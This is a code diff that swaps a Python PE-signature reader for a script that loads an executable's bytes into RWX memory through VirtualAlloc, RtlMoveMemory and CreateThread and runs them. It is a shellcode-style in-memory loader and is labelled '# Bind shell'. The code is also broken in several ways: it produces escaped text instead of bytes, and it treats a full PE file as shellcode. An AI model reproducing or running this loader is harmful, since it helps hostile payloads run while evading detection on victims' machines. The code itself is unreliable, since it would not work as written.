@@ -1,47 +1,60 @@
-import pefile
-from OpenSSL import crypto
-from OpenSSL.crypto import _lib, _ffi, X509
+import sys
+import os
+import ctypes
+EXECUTABLE_FILEPATH = "C:\\Users\\Administrator\\Documents\\GitHub\\python-pe-inmemory-exec\\3DECRYPTED\\executable.exe"
+
+# Retrieve EXECUTABLE_FILEPATH file bytes and execute the file from memory
 
 
-def get_certificates(self):
-    certs = _ffi.NULL
-    if self.type_is_signed():
-        certs = self._pkcs7.d.sign.cert
-    elif self.type_is_signedAndEnveloped():
-        certs = self._pkcs7.d.signed_and_enveloped.cert
+def toshellcode(filebinarydata):
+    shellcode = ''
+    bytes = 0
 
-    pycerts = []
-    for i in range(_lib.sk_X509_num(certs)):
-        pycert = X509.__new__(X509)
-        pycert._x509 = _lib.sk_X509_value(certs, i)
-        pycerts.append(pycert)
+    for b in filebinarydata:
+        shellcode += '\\x' + b.encode('hex')
+        bytes += 1
 
-    if not pycerts:
-        return None
-    return tuple(pycerts)
+    return shellcode
 
 
-SignedFile = "/home/whydoyoucare/freelancer/python-pe-inmemory-exec/testfiles/hh7.golden.exe"
+fb = None
 
-pe = pefile.PE(SignedFile)
+with open(EXECUTABLE_FILEPATH, "rb") as f:
+    fb = toshellcode(f.read())
 
-address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[
-    pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
-].VirtualAddress
-size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[
-    pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_SECURITY"]
-].Size
 
-if address == 0:
-    print("Error: source file not signed")
-else:
-    signature = pe.write()[address + 8:]
+data = fb
+dataLen = len(data)
 
-    pkcs = crypto.load_pkcs7_data(crypto.FILETYPE_ASN1, bytes(signature))
-    certs = get_certificates(pkcs)
 
-    for cert in certs:
-        c = crypto.dump_certificate(crypto.FILETYPE_PEM, cert)
-        a = crypto.load_certificate(crypto.FILETYPE_PEM, c)
-        # get data from parsed cert
-        print(a.get_subject())
+def execute():
+    # Bind shell
+    global data
+    shellcode = data
+
+    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
+                                              ctypes.c_int(len(shellcode)),
+                                              ctypes.c_int(0x3000),
+                                              ctypes.c_int(0x40))
+
+    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+    ctypes.windll.kernel32.RtlMoveMemory(
+        ctypes.c_int(ptr),
+        buf,
+        ctypes.c_int(len(shellcode))
+    )
+
+    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                                             ctypes.c_int(0),
+                                             ctypes.c_int(ptr),
+                                             ctypes.c_int(0),
+                                             ctypes.c_int(0),
+                                             ctypes.pointer(ctypes.c_int(0)))
+
+    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),
+                                               ctypes.c_int(-1))
+
+
+if __name__ == "__main__":
+    execute()
